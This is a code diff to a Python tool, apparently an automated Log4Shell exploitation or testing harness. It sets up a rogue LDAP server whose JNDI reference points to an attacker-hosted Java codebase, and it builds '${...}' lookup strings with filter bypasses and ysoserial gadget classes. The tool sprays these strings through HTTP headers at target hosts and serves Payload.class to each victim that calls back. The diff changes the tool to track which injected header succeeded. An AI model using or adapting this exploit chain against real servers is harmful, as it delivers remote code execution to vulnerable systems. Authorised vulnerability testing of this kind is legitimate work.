@@ -44,7 +44,7 @@ class LDAP(services.Service):
     }
     RESPONSE_LDAP_REFERENCE = {
         'javaClassName': 'Payload',
-        'javaCodeBase': 'http://$ATTACKER_HOST:$ATTACKER_PORT/$$BYPASS_ID/',  # NOTE: Path must end with '/'
+        'javaCodeBase': 'http://$ATTACKER_HOST:$ATTACKER_PORT/$$BYPASS_ID/$$HEADER/',  # NOTE: Path must end with '/'
         'objectClass': 'javaNamingReference',
         'javaFactory': 'Payload',
     }
@@ -69,7 +69,8 @@ class LDAP(services.Service):
     def serialize(self, query_name, context):
         query_name_tmp = query_name.split('/')
         template_type = query_name_tmp[0]
-        context['BYPASS_ID'] = query_name_tmp[-1]
+        context['HEADER'] = query_name_tmp[-1]
+        context['BYPASS_ID'] = query_name_tmp[-2]
         template = self.RESPONSE_LDAP.get(template_type)
         if template == self.RESPONSE_LDAP_SERIALIZED:
             template = self.RESPONSE_LDAP_SERIALIZED.copy()
@@ -155,26 +156,21 @@ class FuzzUri(scenarios.Scene):
 class SendRequests(scenarios.Scene):
 
     async def task(self):
-        stagers = list()
         for ldap_type in LDAP.RESPONSE_LDAP.keys():
             for port in config.LDAP_PORTS:
-                for bypass_id, bypass in enumerate(config.BYPASSES):
-                    if ldap_type == 'serialized':
-                        for cls in YsoserialPayload.PAYLOAD_CLASSES:
-                            stagers.append(
-                                Template('${' + bypass + '/' + ldap_type + '/' + cls + '/' + str(bypass_id) + '}').substitute(LDAP_PORT=port, **self.context)
-                            )
-                    else:
-                        stagers.append(
-                            Template('${' + bypass + '/' + ldap_type + '/' + str(bypass_id) + '}').substitute(LDAP_PORT=port, **self.context)
-                        )
-        for stager in stagers:
-            logging.debug('Using stager: ' + stager)
-            for header in config.HTTP_HEADERS:
-                logging.debug('Using header: ' + header)
-                headers = {header: stager}
-                for target in config.TARGETS:
-                    self.queue.add(FuzzUri, target, headers, stager)
+                for header in config.HTTP_HEADERS:
+                    for bypass_id, bypass in enumerate(config.BYPASSES):
+                        if ldap_type == 'serialized':
+                            for cls in YsoserialPayload.PAYLOAD_CLASSES:
+                                template = Template('${' + bypass + '/' + ldap_type + '/' + cls + '/' + str(bypass_id) + '/' + header + '}').substitute(LDAP_PORT=port, **self.context)
+                                headers = {header: template}
+                                for target in config.TARGETS:
+                                    self.queue.add(FuzzUri, target, headers, template)
+                        else:
+                            template = Template('${' + bypass + '/' + ldap_type + '/' + str(bypass_id) + '/' + header + '}').substitute(LDAP_PORT=port, **self.context)
+                            headers = {header: template}
+                            for target in config.TARGETS:
+                                self.queue.add(FuzzUri, target, headers, template)
 
 
 class Server(services.HTTPStatic):
@@ -187,6 +183,7 @@ class Server(services.HTTPStatic):
         context = self.scenario.context.copy()
         context['VICTIM_HOST'] = sock.getpeername()[0]
         context['BYPASS_ID'] = params['bypass_id']
+        context['HEADER'] = params['header']
         output = self.payload.generate(context)
         logging.debug(str(context['VICTIM_HOST']) + ' requested payload, delivering...')
         return output
@@ -203,7 +200,7 @@ if __name__ == '__main__':
     httpd = Server(address=context['ATTACKER_HOST'], port=context['ATTACKER_PORT'])
     httpd.add_route('/', 'Welcome')
     httpd.add_route('/send-requests', 'Sending requests...')
-    httpd.add_route('/<bypass_id>/Payload.class', Server.payload)
+    httpd.add_route('/<bypass_id>/<header>/Payload.class', Server.payload)
     httpd.add_event('run', when=events.PathContains('send-requests'))
 
     story = scenarios.Scenario(context=context, http_headers={'User-Agent': 'Automated log4j testing'}, debug=True)
